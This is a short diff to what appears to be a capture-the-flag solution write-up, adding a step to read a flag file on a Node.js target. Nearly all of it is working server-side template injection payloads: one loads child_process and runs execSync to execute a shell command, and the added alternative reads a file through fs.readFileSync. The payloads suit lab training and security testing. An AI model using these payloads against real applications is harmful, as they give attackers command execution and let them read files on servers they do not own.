@@ -9,6 +9,8 @@
 7. Access FLAG_PATH and cat the file `/tmp/.file64.32738` using
 ```
 #{(function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").execSync('cat /tmp/.file64.32738'); return sh;})()}
+or
+#{(function(){return JSON.stringify(process.mainModule.require('fs').readFileSync('/tmp/.file64.32738'))})()}
 ```
 8. Get the flag
 
